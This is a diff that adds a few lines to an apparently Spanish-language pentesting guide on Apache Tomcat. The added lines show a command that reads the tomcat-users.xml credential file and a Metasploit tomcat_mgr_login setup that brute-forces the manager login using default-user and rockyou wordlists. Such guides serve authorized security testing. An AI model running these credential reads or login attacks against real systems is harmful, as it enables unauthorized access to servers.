@@ -68,3 +68,18 @@ Si la consola de administración es accesible, generalmente aparece en la págin
 
 Tomcat almacena credenciales en tomcat-users.xml. Si tenemos acceso, podemos enumerar los usuarios configurados:
 
+```bash
+cat /etc/tomcat*/tomcat-users.xml
+```
+
+Si no tenemos acceso directo, podemos intentar un escaneo con Metasploit:
+
+```bash
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS <url>
+set USER_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+run
+```
+
+
